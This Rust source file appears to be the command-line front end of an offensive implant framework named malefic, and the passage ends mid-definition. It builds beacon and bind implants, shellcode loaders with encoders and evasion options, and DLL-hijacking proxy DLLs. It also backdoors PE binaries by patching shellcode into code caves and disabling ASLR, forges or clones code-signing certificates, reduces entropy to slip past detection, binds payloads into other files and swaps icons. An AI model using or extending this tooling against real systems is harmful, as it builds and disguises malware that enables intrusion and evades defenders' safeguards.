#[allow(deprecated)]
use anyhow::Context;
use clap::Parser;
use cmd::SrdiType;
use generate::{beacon, bind, prelude, pulse};

use build::*;
use jsonschema::Validator;
use serde_json::Value as JsonValue;
use serde_yaml::Value as YamlValue;

use crate::build::payload::{build_payload, BuildProfile};
use crate::cmd::{
    BinderCommands, BuildCommands, Cli, Commands, GenerateCommands, IconCommands, PayloadType,
    SigForgeCommands, Tool, WatermarkCommands,
};
use crate::tool::sigforge::SignatureRemover;
use config::{Implant, Version};
use std::{fs, path::Path, process, time::Duration};
use strum_macros::{Display, EnumString};

mod build;
mod cmd;
mod config;
mod generate;
mod logger;
mod tool;

#[derive(Debug, Clone, Copy, EnumString, Display)]
pub enum Platform {
    #[strum(serialize = "win")]
    Win,
    #[strum(serialize = "linux")]
    Linux,
    #[strum(serialize = "darwin")]
    Darwin,
}

static CONFIG_SCHEMA: &str = include_str!("../config_lint.json");

static DEFAULT: &str = "default";
static FEATURES: &str = "features";

static RESOURCES_DIR: &str = "./resources/";

fn load_yaml_config(yaml_path: &str) -> anyhow::Result<Implant> {
    log_step!("Loading configuration from {}", yaml_path);
    let yaml_content = fs::read_to_string(yaml_path).map_err(|e| {
        log_error!("Failed to read YAML configuration file: {}", e);
        e
    })?;

    let config: Implant = serde_yaml::from_str(&yaml_content).map_err(|e| {
        log_error!("Failed to parse YAML configuration: {}", e);
        e
    })?;

    log_success!("Configuration loaded successfully");
    Ok(config)
}

fn validate_yaml_config(yaml_path: &str) -> anyhow::Result<()> {
    log_step!("Validating configuration schema...");
    let yaml_content = fs::read_to_string(yaml_path)?;
    let yaml_value: YamlValue = serde_yaml::from_str(&yaml_content)?;
    let json_value = serde_json::to_value(&yaml_value)?;

    let schema: JsonValue =
        serde_json::from_str(CONFIG_SCHEMA).expect("Failed to parse embedded JSON schema");

    let compiled_schema = Validator::new(&schema).expect("Invalid JSON Schema");

    if let Err(error) = compiled_schema.validate(&json_value) {
        log_error!(
            "Schema validation '{}' failed: {}",
            error.instance_path,
            error
        );
        process::exit(1);
    }

    log_success!("Configuration schema is valid");
    Ok(())
}

// Define the CLI structure

fn parse_generate(
    yaml_config: &mut Implant,
    config: &GenerateCommands,
    version: Version,
    patch_mode: bool,
    source: bool,
    metadata_wordlist: Option<&str>,
) -> anyhow::Result<()> {
    log_step!("Starting configuration generation...");

    if patch_mode {
        let build = yaml_config
            .build
            .as_mut()
            .ok_or_else(|| anyhow::anyhow!("build configuration is required but not found"))?;
        build.obfstr = false;
        log_info!("Patch mode enabled: obfstr disabled, generate XOR blocks for patching");
    }

    let result = match config {
        GenerateCommands::Beacon => {
            log_info!("Generating beacon configuration");
            beacon(yaml_config, &version, source, metadata_wordlist)
        }
        GenerateCommands::Bind => {
            log_info!("Generating bind configuration");
            bind(yaml_config, &version, source, metadata_wordlist)
        }
        GenerateCommands::Prelude {
            yaml_path: prelude_yaml_path,
            resources,
            key,
            spite,
        } => {
            log_info!("Generating prelude configuration");
            prelude(
                yaml_config,
                &version,
                source,
                prelude_yaml_path,
                resources,
                key,
                spite,
                metadata_wordlist,
            )
        }
        GenerateCommands::Modules { module } => {
            if !module.is_empty() {
                yaml_config.implants.modules = module.split(",").map(|x| x.to_string()).collect();
                log_info!("Using modules: {:?}", yaml_config.implants.modules);
            }
            beacon(yaml_config, &version, source, metadata_wordlist)
        }
        GenerateCommands::Pulse { platform, arch } => {
            log_info!("Generating pulse configuration for {} {}", platform, arch);
            pulse(source)?;
            let pulse_config = yaml_config
                .pulse
                .clone()
                .ok_or_else(|| anyhow::anyhow!("pulse configuration is required but not found"))?;
            pulse_generate(pulse_config, *platform, *arch, version, source)
        }
        GenerateCommands::Loader { command } => {
            use crate::cmd::LoaderCommands;
            match command {
                LoaderCommands::Template {
                    template,
                    list,
                    input,
                    encoding,
                    debug,
                } => {
                    use crate::tool::loader::template::{TemplateLoader, LOADER_NAMES};

                    if *list {
                        log_info!("Available loader templates:");
                        for name in LOADER_NAMES {
                            println!("  {}", name);
                        }
                        return Ok(());
                    }

                    let mut loader = if template == "random" {
                        log_info!("Using random template selection");
                        TemplateLoader::random()
                    } else {
                        TemplateLoader::with_template(template)
                    };

                    loader = loader.with_debug(*debug);

                    if let Some(evader) = yaml_config.loader.as_ref().and_then(|l| l.evader.clone())
                    {
                        loader = loader.with_evader(evader);
                    }

                    if let Some(enc) = encoding {
                        let input_path = input.as_ref().ok_or_else(|| {
                            anyhow::anyhow!("--input is required when --encoding is specified")
                        })?;

                        let payload_data = std::fs::read(input_path).map_err(|e| {
                            anyhow::anyhow!("Failed to read payload '{}': {}", input_path, e)
                        })?;
                        log_info!(
                            "Read {} bytes payload from {}",
                            payload_data.len(),
                            input_path
                        );

                        use crate::tool::encoder::{self, EncodingType};
                        let enc_type = EncodingType::from_str(enc)?;
                        log_step!("Encoding payload with: {}", enc_type);
                        let result = encoder::encode_payload(&payload_data, &enc_type)?;

                        let enc_data = if !result.strings.is_empty() {
                            result.strings.join("\n").into_bytes()
                        } else {
                            result.encoded.clone()
                        };

                        TemplateLoader::write_payload(&enc_data, &result.key, &result.extra)?;
                        log_info!(
                            "Encoded payload written to malefic-loader/generated/ ({} bytes)",
                            enc_data.len()
                        );

                        loader = loader.with_encoding(enc);
                    } else {
                        TemplateLoader::clear_payload()?;
                    }

                    loader = loader.with_debug(*debug);

                    log_step!(
                        "Building loader with template: {}{}{}",
                        loader.get_template(),
                        loader
                            .encoding
                            .as_ref()
                            .map(|e| format!(" + encoding: {}", e))
                            .unwrap_or_default(),
                        if *debug { " [debug]" } else { "" }
                    );
                    let path = loader.build(true, "x86_64-pc-windows-gnu")?;
                    log_success!("Loader built: {}", path.display());
                    Ok(())
                }
                LoaderCommands::ProxyDll {
                    raw_dll,
                    proxied_dll,
                    proxy_dll,
                    hijacked_exports,
                    native_thread,
                    hijack_dll_main,
                } => {
                    // Try to get config from yaml, command line args override config file
                    let proxydll_config = yaml_config
                        .loader
                        .as_ref()
                        .and_then(|l| l.proxydll.as_ref());

                    // Determine actual values (CLI args > config file)
                    let raw_dll_path = if !raw_dll.is_empty() {
                        raw_dll.clone()
                    } else if let Some(cfg) = proxydll_config {
                        cfg.raw_dll.clone()
                    } else {
                        return Err(anyhow::anyhow!(
                            "raw_dll is required (use -r or configure in yaml)"
                        ));
                    };

                    let proxied_dll_path = if !proxied_dll.is_empty() {
                        proxied_dll.clone()
                    } else if let Some(cfg) = proxydll_config {
                        cfg.proxied_dll.clone()
                    } else {
                        return Err(anyhow::anyhow!(
                            "proxied_dll is required (use -p or configure in yaml)"
                        ));
                    };

                    // Proxy DLL name: CLI > config > extract from proxied_dll
                    let proxy_dll_name = if let Some(out) = proxy_dll {
                        out.clone()
                    } else if let Some(cfg) = proxydll_config {
                        cfg.proxy_dll.clone().unwrap_or_else(|| {
                            std::path::Path::new(&cfg.proxied_dll)
                                .file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or(&cfg.proxied_dll)
                                .to_string()
                        })
                    } else {
                        std::path::Path::new(&proxied_dll_path)
                            .file_name()
                            .and_then(|n| n.to_str())
                            .unwrap_or(&proxied_dll_path)
                            .to_string()
                    };

                    let hijacked_funcs = if !hijacked_exports.is_empty() {
                        hijacked_exports.clone()
                    } else if let Some(cfg) = proxydll_config {
                        cfg.proxyfunc.clone()
                    } else {
                        String::new()
                    };

                    let use_native_thread =
                        *native_thread || proxydll_config.map_or(false, |c| c.native_thread);
                    let use_block = proxydll_config.map_or(false, |c| c.block);
                    let _resource_dir = proxydll_config
                        .map(|c| c.resource_dir.clone())
                        .unwrap_or_else(|| "resources/proxydll".to_string());
                    let _pack_resources = proxydll_config.map_or(false, |c| c.pack_resources);
                    let hijack_dllmain =
                        *hijack_dll_main || proxydll_config.map_or(false, |c| c.hijack_dllmain);

                    // Use implant.prelude configuration to determine if prelude should be enabled
                    // Clone the prelude path to avoid borrow issues
                    let prelude_path = yaml_config.implants.prelude.clone();
                    let use_prelude = !prelude_path.is_empty();

                    // Generate spites if prelude is configured
                    if use_prelude {
                        log_step!("Generating spites for ProxyDLL prelude...");
                        prelude(
                            yaml_config,
                            &version,
                            source,
                            &prelude_path,
                            "resources",
                            "maliceofinternal",
                            "spite.bin",
                            None,
                        )?;
                    }

                    log_info!("Generating ProxyDLL for {}", raw_dll_path);
                    let exports: Vec<&str> = if hijacked_funcs.is_empty() {
                        Vec::new()
                    } else {
                        hijacked_funcs.split(',').map(|s| s.trim()).collect()
                    };

                    // Generate the proxy DLL
                    tool::proxydll::generator::update_proxydll(
                        &raw_dll_path,
                        &proxied_dll_path,
                        &proxy_dll_name,
                        &exports,
                        use_native_thread,
                        use_block,
                        use_prelude,
                        hijack_dllmain,
                    )?;

                    Ok(())
                }
                LoaderCommands::Patch {
                    file,
                    input,
                    output,
                    find_caves,
                    add_section,
                    section_name,
                    min_cave,
                    no_disable_aslr,
                    no_zero_cert,
                    wait,
                    technique,
                    stub_hash,
                    stub_poly,
                    stub_encrypt,
                    evasion,
                    seed,
                } => {
                    use crate::tool::loader::bdf::evasion::{
                        HashAlgorithm, PolyLevel, StubEvasion,
                    };
                    use crate::tool::loader::bdf::pe::{ExecutionTechnique, ThreadWait};
                    use crate::tool::loader::PatchLoader;

                    let thread_wait = if wait == "wait" {
                        ThreadWait::WaitInfinite
                    } else if let Some(secs) = wait.strip_prefix("sleep:") {
                        let n: u32 = secs.parse().map_err(|_| {
                            anyhow::anyhow!(
                                "Invalid sleep seconds '{}', expected e.g. 'sleep:5'",
                                secs
                            )
                        })?;
                        ThreadWait::Sleep(n)
                    } else {
                        ThreadWait::None
                    };

                    let exec_technique = ExecutionTechnique::from_str(technique)?;

                    // Build evasion config: preset first, then individual flags override
                    let mut stub_evasion = StubEvasion::from_preset(evasion)?;
                    if stub_hash != "ror13" {
                        stub_evasion.hash_algorithm = HashAlgorithm::from_str(stub_hash)?;
                    }
                    if *stub_poly {
                        stub_evasion.poly_level = PolyLevel::Full;
                    }
                    if *stub_encrypt {
                        stub_evasion.encrypt = true;
                    }
                    if *seed != 0 {
                        stub_evasion.seed = *seed;
                    }

                    let loader = PatchLoader {
                        target_binary: Some(file.clone()),
                        add_section: *add_section,
                        section_name: section_name.clone(),
                        min_cave_size: *min_cave,
                        disable_aslr: !*no_disable_aslr,
                        zero_cert: !*no_zero_cert,
                        thread_wait,
                        execution_technique: exec_technique,
                        evasion: stub_evasion,
                    };

                    if *find_caves {
                        let caves = loader.find_caves()?;
                        if caves.is_empty() {
                            log_info!(
                                "No suitable code caves found (min size: {} bytes)",
                                min_cave
                            );
                        } else {
                            log_info!(
                                "Found {} code cave(s) (min size: {} bytes):",
                                caves.len(),
                                min_cave
                            );
                            for (i, cave) in caves.iter().enumerate() {
                                println!(
                                    "  {}. Section: {:8} | FileOff: 0x{:08X} | VA: 0x{:08X} | Size: {} bytes",
                                    i + 1, cave.section_name, cave.start, cave.virtual_address, cave.size
                                );
                            }
                        }
                        return Ok(());
                    }

                    let shellcode = {
                        let input_path = input.as_ref().ok_or_else(|| {
                            anyhow::anyhow!("--input (-i) is required for patching")
                        })?;
                        std::fs::read(input_path).map_err(|e| {
                            anyhow::anyhow!("Failed to read shellcode '{}': {}", input_path, e)
                        })?
                    };

                    let patched = loader.patch(&shellcode)?;

                    let output_path = output
                        .clone()
                        .unwrap_or_else(|| format!("{}.patched", file));
                    std::fs::write(&output_path, &patched)?;
                    log_success!("Patched -> {} ({} bytes)", output_path, patched.len());

                    Ok(())
                }
            }
        }
    };

    if result.is_ok() {
        log_success!("Configuration generation completed successfully");
    }
    result
}

fn parse_build(
    config: &mut Implant,
    build: &BuildCommands,
    target: &String,
    build_lib: bool,
    dev_build: bool,
) -> anyhow::Result<()> {
    let build_config = config
        .build
        .as_mut()
        .ok_or_else(|| anyhow::anyhow!("build configuration is required but not found"))?;
    let profile = BuildProfile::from_dev(dev_build);

    let result = match build {
        BuildCommands::Malefic => build_payload(
            build_config,
            &PayloadType::MALEFIC,
            target,
            None,
            build_lib,
            profile,
        ),
        BuildCommands::Modules { module } => {
            use crate::generate::update_module_toml;
            // 1. Check if command line argument is empty, decide whether to use config or command line
            let mut modules: Vec<String> = Vec::new();
            if !module.is_empty() {
                modules.extend(module.split(',').map(|s| s.trim().to_string()));
                config.implants.modules = modules.clone();
            } else {
                modules = config.implants.modules.clone();
            }
            // 2. Update features to toml
            update_module_toml(&modules, true);
            // 3. Compile malefic-modules
            build_payload(
                build_config,
                &PayloadType::MODULES,
                target,
                Some(&modules),
                build_lib,
                profile,
            )
        }
        BuildCommands::Modules3rd { module } => {
            use crate::generate::update_3rd_toml;
            // 1. Check if command line argument is empty, decide whether to use config or command line
            let mut third_modules: Vec<String> = Vec::new();
            if !module.is_empty() {
                third_modules.extend(module.split(',').map(|s| s.trim().to_string()));
                config.implants.third_modules = third_modules.clone();
            } else {
                third_modules = config.implants.third_modules.clone();
            }
            third_modules.push("as_module_dll".to_string());
            update_3rd_toml(&third_modules);
            build_payload(
                build_config,
                &PayloadType::THIRD,
                target,
                Some(&third_modules),
                build_lib,
                profile,
            )
        }
        BuildCommands::Pulse { shellcode } => {
            let mut extra_features = Vec::new();
            if *shellcode {
                extra_features.push("shellcode".to_string());
            }
            let features = if extra_features.is_empty() {
                None
            } else {
                Some(&extra_features)
            };
            // shellcode always builds as bin (never lib)
            let pulse_lib = if *shellcode { false } else { build_lib };
            build_payload(
                build_config,
                &PayloadType::PULSE,
                target,
                features,
                pulse_lib,
                profile,
            )?;

            // Post-process: extract .text section as raw shellcode
            if *shellcode {
                let exe_path = format!(
                    "target/{}/{}/malefic-pulse.exe",
                    target,
                    profile.output_dir()
                );
                let bin_path = format!(
                    "target/{}/{}/malefic-pulse.bin",
                    target,
                    profile.output_dir()
                );
                use crate::tool::pe::PEObjCopy;
                PEObjCopy::extract_binary(&exe_path, &bin_path)?;
                log_success!(
                    "Pulse shellcode: {} ({} bytes)",
                    bin_path,
                    std::fs::metadata(&bin_path).map(|m| m.len()).unwrap_or(0)
                );
            }
            Ok(())
        }
        BuildCommands::Prelude => build_payload(
            build_config,
            &PayloadType::PRELUDE,
            target,
            None,
            build_lib,
            profile,
        ),
        BuildCommands::ProxyDll => build_payload(
            build_config,
            &PayloadType::PROXYDLL,
            target,
            None,
            build_lib,
            profile,
        ),
    };
    result
}

fn parse_tool(tool: &Tool) -> anyhow::Result<()> {
    match tool {
        Tool::SRDI {
            r#type: srdi_type,
            input: src_path,
            platform,
            arch,
            output: target_path,
            function_name,
            userdata_path,
        } => {
            log_step!("Building SRDI...");
            log_info!(
                "Type: {}, Platform: {}, Arch: {}",
                srdi_type,
                platform,
                arch
            );

            let userdata = if userdata_path.is_empty() {
                Vec::new()
            } else {
                log_info!("Loading userdata from {}", userdata_path);
                fs::read(userdata_path)?
            };

            let result = match srdi_type {
                SrdiType::LINK => {
                    log_info!("Using LINK SRDI generator");
                    link_srdi_generator(
                        src_path,
                        *platform,
                        *arch,
                        target_path,
                        function_name,
                        &userdata,
                    )
                }
                SrdiType::MALEFIC => {
                    log_info!("Using MALEFIC SRDI generator");
                    malefic_srdi_generator(
                        src_path,
                        *platform,
                        *arch,
                        target_path,
                        function_name,
                        &userdata,
                    )
                }
            };

            if result.is_ok() {
                log_success!("SRDI build completed successfully");
            }
            result
        }
        Tool::STRIP {
            input,
            output,
            custom_paths,
        } => {
            use crate::tool::strip::strip_paths_from_binary;

            log_step!("Stripping paths from binary...");
            log_info!("Input: {}, Output: {}", input, output);

            let custom_path_list: Vec<String> = if custom_paths.is_empty() {
                Vec::new()
            } else {
                custom_paths
                    .split(',')
                    .map(|s| s.trim().to_string())
                    .collect()
            };

            if !custom_path_list.is_empty() {
                log_info!("Custom paths: {:?}", custom_path_list);
            }

            let result = strip_paths_from_binary(input, output, &custom_path_list);

            if result.is_ok() {
                log_success!("Path stripping completed successfully");
            }
            result
        }
        Tool::OBJCOPY {
            output_format,
            input,
            output,
        } => {
            use crate::tool::pe::PEObjCopy;

            log_step!("Converting binary file...");
            log_info!(
                "Input: {}, Output: {}, Format: {}",
                input,
                output,
                output_format
            );

            let result = match output_format.as_str() {
                "binary" => PEObjCopy::extract_binary(input, output),
                _ => {
                    log_error!("Unsupported output format: {}", output_format);
                    log_info!("Supported formats: binary");
                    Err(anyhow::anyhow!(
                        "Unsupported output format: {}",
                        output_format
                    ))
                }
            };

            if result.is_ok() {
                log_success!("Binary conversion completed successfully");
            }
            result
        }
        Tool::Patch {
            file,
            name,
            key,
            server_address,
            output,
            xor_key,
        } => {
            use crate::tool::patch::{
                batch_patch_binary, BatchPatchOptions, FieldPatch, PatchField,
            };

            // Collect patches
            let mut patches = Vec::new();

            let resolved_xor_key = resolve_patch_xor_key(xor_key.as_deref())?;
            let xor_key_bytes = resolved_xor_key.as_bytes().to_vec();

            if let Some(name_val) = name {
                patches.push(FieldPatch {
                    field: PatchField::Name,
                    value: name_val.clone(),
                    is_hex: false,
                    default_value: None,
                });
            }

            if let Some(key_val) = key {
                patches.push(FieldPatch {
                    field: PatchField::Key,
                    value: key_val.clone(),
                    is_hex: false,
                    default_value: Some(resolved_xor_key.clone()),
                });
            }

            if let Some(addr) = server_address {
                patches.push(FieldPatch {
                    field: PatchField::ServerAddress,
                    value: addr.clone(),
                    is_hex: false,
                    default_value: None,
                });
            }

            if patches.is_empty() {
                log_error!("No fields specified to patch. Use --name, --key, or --server-address");
                return Err(anyhow::anyhow!("no fields specified for patching"));
            }

            log_step!("Patching {} field(s) in {}", patches.len(), file);
            for patch in &patches {
                log_info!("  {} = {}", patch.field.label(), patch.value);
            }

            let options = BatchPatchOptions {
                file: file.clone(),
                patches,
                output: output.clone(),
                xor_key: xor_key_bytes,
            };

            let outcome = batch_patch_binary(&options)?;
            let overwritten = outcome.output_path == std::path::PathBuf::from(file);

            log_success!(
                "Successfully patched {} field(s)",
                outcome.patched_fields.len()
            );
            for (field, offset) in &outcome.patched_fields {
                log_info!(
                    "  {} at offset 0x{:X} ({} decimal)",
                    field.label(),
                    offset,
                    offset
                );
            }

            if overwritten {
                log_info!("Original file overwritten in-place");
            } else {
                log_info!("Patched file written to {}", outcome.output_path.display());
            }
            Ok(())
        }
        Tool::PatchConfig {
            file,
            config,
            from_implant,
            blob,
            output,
        } => {
            use crate::tool::patch::{patch_config_blob, ConfigBlobPatchOptions};
            use malefic_config::{encode_runtime_config, CONFIG_BLOB_B64_LEN};

            log_step!("Patching runtime config blob in {}", file);

            let blob_str = if let Some(b64) = blob {
                normalize_blob_string(b64, CONFIG_BLOB_B64_LEN)?
            } else {
                let cfg = if let Some(path) = from_implant.as_ref() {
                    let implant = load_yaml_config(path)?;
                    convert_implant_to_runtime_config(&implant)?
                } else {
                    let cfg_path = config
                        .as_ref()
                        .ok_or_else(|| anyhow::anyhow!("--config or --blob must be provided"))?;
                    load_runtime_config_from_file(cfg_path)?
                };
                let encoded = encode_runtime_config(&cfg)
                    .map_err(|e| anyhow::anyhow!("encode_runtime_config failed: {:?}", e))?;
                encoded
            };

            let opts = ConfigBlobPatchOptions {
                file: file.clone(),
                blob_b64: blob_str,
                blob_len: CONFIG_BLOB_B64_LEN,
                output: output.clone(),
            };

            let outcome = patch_config_blob(&opts)?;
            let overwritten = outcome.output_path == std::path::PathBuf::from(file);

            log_success!(
                "Patched runtime config blob at offset 0x{:X} ({} decimal)",
                outcome.offset,
                outcome.offset
            );
            if overwritten {
                log_info!("Original file overwritten in-place");
            } else {
                log_info!("Patched file written to {}", outcome.output_path.display());
            }
            Ok(())
        }
        Tool::Encode {
            input,
            encoding,
            output,
            format,
            list,
        } => {
            use crate::tool::encoder::{self, EncodingType, OutputFormat, ENCODING_NAMES};

            if *list {
                log_info!("Available encodings:");
                for name in ENCODING_NAMES {
                    println!("  {}", name);
                }
                return Ok(());
            }

            let input_path = input
                .as_ref()
                .ok_or_else(|| anyhow::anyhow!("Input file is required (use -i <file>)"))?;

            let data = std::fs::read(input_path).map_err(|e| {
                anyhow::anyhow!("Failed to read input file '{}': {}", input_path, e)
            })?;
            log_info!("Read {} bytes from {}", data.len(), input_path);

            let enc_type = EncodingType::from_str(encoding)?;
            let out_fmt = OutputFormat::from_str(format)?;

            log_step!("Encoding with: {}", enc_type);
            let result = encoder::encode_payload(&data, &enc_type)?;

            let base_path = output
                .clone()
                .unwrap_or_else(|| format!("{}.encoded", input_path));

            match out_fmt {
                OutputFormat::Bin => {
                    std::fs::write(&base_path, &result.encoded)?;
                    log_success!("Encoded payload written to: {}", base_path);

                    if !result.key.is_empty() {
                        let key_path = format!("{}.key", base_path);
                        std::fs::write(&key_path, &result.key)?;
                        log_info!("Key written to: {}", key_path);
                    }
                    if !result.extra.is_empty() {
                        let extra_path = format!("{}.extra", base_path);
                        std::fs::write(&extra_path, &result.extra)?;
                        log_info!("Extra material (nonce/IV) written to: {}", extra_path);
                    }
                }
                OutputFormat::C | OutputFormat::Rust => {
                    let formatted = encoder::format_output(&result, &enc_type, &out_fmt);
                    if output.is_some() {
                        std::fs::write(&base_path, &formatted)?;
                        log_success!("Output written to: {}", base_path);
                    } else {
                        println!("{}", formatted);
                    }
                }
                OutputFormat::All => {
                    let stem = std::path::Path::new(&base_path)
                        .file_stem()
                        .and_then(|s| s.to_str())
                        .unwrap_or(&base_path);
                    let parent = std::path::Path::new(&base_path)
                        .parent()
                        .unwrap_or(std::path::Path::new("."));

                    let bin_path = parent.join(format!("{}.bin", stem));
                    std::fs::write(&bin_path, &result.encoded)?;
                    log_success!("Binary written to: {}", bin_path.display());

                    if !result.key.is_empty() {
                        let key_path = parent.join(format!("{}.key", stem));
                        std::fs::write(&key_path, &result.key)?;
                        log_info!("Key written to: {}", key_path.display());
                    }
                    if !result.extra.is_empty() {
                        let extra_path = parent.join(format!("{}.extra", stem));
                        std::fs::write(&extra_path, &result.extra)?;
                        log_info!("Extra material written to: {}", extra_path.display());
                    }

                    let c_path = parent.join(format!("{}.c", stem));
                    let c_output = encoder::format_output(&result, &enc_type, &OutputFormat::C);
                    std::fs::write(&c_path, &c_output)?;
                    log_success!("C output written to: {}", c_path.display());

                    let rs_path = parent.join(format!("{}.rs", stem));
                    let rs_output = encoder::format_output(&result, &enc_type, &OutputFormat::Rust);
                    std::fs::write(&rs_path, &rs_output)?;
                    log_success!("Rust output written to: {}", rs_path.display());
                }
            }

            log_success!(
                "Encoding complete ({}, {} bytes -> {} bytes)",
                enc_type,
                data.len(),
                result.encoded.len()
            );
            Ok(())
        }
        Tool::Entropy {
            input,
            output,
            threshold,
            strategy,
            max_growth,
            measure_only,
        } => parse_entropy(
            input,
            output.as_deref(),
            *threshold,
            strategy,
            *max_growth,
            *measure_only,
        ),
        Tool::SigForge { command } => parse_sigforge(command),
        Tool::Watermark { command } => parse_watermark(command),
        Tool::Binder { command } => parse_binder(command),
        Tool::Icon { command } => parse_icon(command),
    }
}

fn parse_sigforge(command: &SigForgeCommands) -> anyhow::Result<()> {
    use crate::tool::sigforge::{SignatureExtractor, SignatureInjector};

    match command {
        SigForgeCommands::Extract { input, output } => {
            log_step!("Extracting signature from {}", input);

            let signature = SignatureExtractor::extract_from_file(&input)?;

            let output_path = output
                .as_ref()
                .map(|s| s.clone())
                .unwrap_or_else(|| format!("{}_sig", input));
            SignatureExtractor::save_signature_to_file(&signature, &output_path)?;

            log_success!("Signature extracted to: {}", output_path);
            log_info!("Signature size: {} bytes", signature.len());
            Ok(())
        }

        SigForgeCommands::Copy {
            source,
            target,
            output,
        } => {
            log_step!("Copying signature from {} to {}", source, target);

            let output_path =
                SignatureInjector::copy_signature(&source, &target, output.as_deref())?;

            log_success!("Signature copied to: {}", output_path);
            Ok(())
        }

        SigForgeCommands::Inject {
            signature,
            target,
            output,
        } => {
            log_step!("Injecting signature from {} into {}", signature, target);

            let output_path =
                SignatureInjector::inject_from_file(&signature, &target, output.as_deref())?;

            log_success!("Signature injected to: {}", output_path);
            Ok(())
        }

        SigForgeCommands::Remove { input, output } => {
            log_step!("Removing signature from {}", input);

            let _output_path = output
                .as_ref()
                .map(|s| s.clone())
                .unwrap_or_else(|| format!("{}_unsigned", input));

            let output_path = SignatureRemover::remove_signature(&input, output.as_deref())?;

            log_info!("Signature removal functionality to be implemented");
            log_success!("Signature removed, output: {}", output_path);
            Ok(())
        }
        SigForgeCommands::Check { input } => {
            let is_signed = SignatureExtractor::check_if_signed(&input)?;

            if is_signed {
                log_success!("File {} is signed", input);
            } else {
                log_success!("File {} is not signed", input);
            }
            Ok(())
        }
        SigForgeCommands::CarbonCopy {
            host,
            port,
            cert_file,
            target,
            output,
        } => {
            use crate::tool::sigforge::carbon_copy;

            if host.is_none() && cert_file.is_none() {
                return Err(anyhow::anyhow!(
                    "Either --host or --cert-file must be specified"
                ));
            }

            if let Some(h) = host.as_ref() {
                log_step!("Cloning certificate from {}:{}", h, port);
            } else if let Some(f) = cert_file.as_ref() {
                log_step!("Loading certificate from file: {}", f);
            }

            let result_path = carbon_copy::carbon_copy(
                host.as_deref(),
                *port,
                cert_file.as_deref(),
                target,
                output.as_deref(),
            )?;

            log_success!("Certificate injected, output: {}", result_path);
            Ok(())
        }
    }
}

fn parse_entropy(
    input: &str,
    output: Option<&str>,
    threshold: f64,
    strategy: &str,
    max_growth: f64,
    measure_only: bool,
) -> anyhow::Result<()> {
    use crate::tool::entropy::{reduce_entropy, shannon_entropy, ReduceStrategy};

    let data =
        std::fs::read(input).map_err(|e| anyhow::anyhow!("Failed to read '{}': {}", input, e))?;

    let current = shannon_entropy(&data);
    log_info!(
        "Current entropy of '{}': {:.4} (file size: {} bytes)",
        input,
        current,
        data.len()
    );

    if measure_only {
        log_success!("Entropy: {:.4}", current);
        return Ok(());
    }

    let output_path = output
        .map(|s| s.to_string())
        .unwrap_or_else(|| format!("{}_reduced", input));

    let strat: ReduceStrategy = strategy
        .parse()
        .map_err(|e: String| anyhow::anyhow!("{}", e))?;

    log_step!(
        "Reducing entropy with strategy '{}', threshold {:.2}, max growth {:.1}x",
        strat,
        threshold,
        max_growth
    );

    let (result, final_entropy) = reduce_entropy(&data, threshold, strat, max_growth);

    std::fs::write(&output_path, &result)?;

    log_success!(
        "Entropy reduced: {:.4} -> {:.4} (file: {} -> {} bytes)",
        current,
        final_entropy,
        data.len(),
        result.len()
    );
    log_info!("Output written to: {}", output_path);

    if final_entropy > threshold {
        log_warning!(
            "Could not reach threshold {:.2} within growth limit (final: {:.4})",
            threshold,
            final_entropy
        );
    }

    Ok(())
}

fn parse_watermark(command: &WatermarkCommands) -> anyhow::Result<()> {
    use crate::tool::watermark::{read_watermark, write_watermark, WatermarkMethod};

    match command {
        WatermarkCommands::Write {
            input,
            output,
            method,
            watermark,
        } => {
            let m: WatermarkMethod = method
                .parse()
                .map_err(|e: String| anyhow::anyhow!("{}", e))?;

            log_step!("Writing watermark ({}) to '{}'", m, input);

            write_watermark(input, output, m, watermark.as_bytes())?;

            log_success!("Watermark written to: {}", output);
            Ok(())
        }
        WatermarkCommands::Read {
            input,
            method,
            size,
        } => {
            let m: WatermarkMethod = method
                .parse()
                .map_err(|e: String| anyhow::anyhow!("{}", e))?;

            log_step!("Reading watermark ({}) from '{}'", m, input);

            let data = read_watermark(input, m, *size)?;

            // Try to display as UTF-8, fall back to hex
            match String::from_utf8(data.clone()) {
                Ok(s) => {
                    let trimmed = s.trim_end_matches('\0');
                    log_success!("Watermark (string): {}", trimmed);
                }
                Err(_) => {
                    log_success!("Watermark (hex): {}", hex::encode(&data));
                }
            }
            Ok(())
        }
    }
}

fn parse_binder(command: &BinderCommands) -> anyhow::Result<()> {
    use crate::tool::binder;

    match command {
        BinderCommands::Bind {
            primary,
            secondary,
            output,
        } => {
            log_step!("Binding '{}' + '{}' -> '{}'", primary, secondary, output);

            binder::bind(primary, secondary, output, 0)?;

            let output_size = std::fs::metadata(output)?.len();
            log_success!("Bound file created: {} ({} bytes)", output, output_size);
            Ok(())
        }
        BinderCommands::Extract { input, output } => {
            log_step!("Extracting embedded payload from '{}'", input);

            let payload = binder::extract(input)?;

            std::fs::write(output, &payload)?;
            log_success!("Payload extracted to: {} ({} bytes)", output, payload.len());
            Ok(())
        }
        BinderCommands::Check { input } => {
            log_step!("Checking '{}' for embedded payload", input);

            match binder::check(input)? {
                Some(meta) => {
                    log_success!("File contains embedded payload:");
                    log_info!("  Payload offset: 0x{:X}", meta.payload_offset);
                    log_info!("  Payload size:   {} bytes", meta.payload_size);
                    log_info!("  Original size:  {} bytes", meta.original_size);
                    log_info!("  CRC32:          0x{:08X}", meta.checksum);
                }
                None => {
                    log_info!("File does not contain embedded payload");
                }
            }
            Ok(())
        }
    }
}

fn parse_icon(command: &IconCommands) -> anyhow::Result<()> {
    use crate::tool::icon;

    match command {
        IconCommands::Replace { input, ico, output } => {
            log_step!("Replacing icon in '{}' with '{}'", input, ico);

            icon::replace_icon(input, ico, output)?;

            log_success!("Icon replaced, output: {}", output);
            Ok(())
        }
        IconCommands::Extract { input, output } => {
            log_step!("Extracting icon from '{}'", input);

            icon::extract_icon(input, output)?;

            log_success!("Icon extracted to: {}", output);
            Ok(())
        }
    }
}

fn load_runtime_config_from_file(path: &str) -> anyhow::Result<malefic_config::RuntimeConfig> {
    #[derive(serde::Deserialize)]
    #[serde(untagged)]
    enum KeyField {
        Text(String),
        Bytes(Vec<u8>),
    }

    impl KeyField {
        fn into_bytes(self) -> Vec<u8> {
            match self {
                KeyField::Text(s) => s.into_bytes(),
                KeyField::Bytes(b) => b,
            }
        }
    }

    #[derive(serde::Deserialize)]
    struct GuardrailConfigFile {
        #[serde(default)]
        ip_addresses: Vec<String>,
        #[serde(default)]
        usernames: Vec<String>,
        #[serde(default)]
        server_names: Vec<String>,
        #[serde(default)]
        domains: Vec<String>,
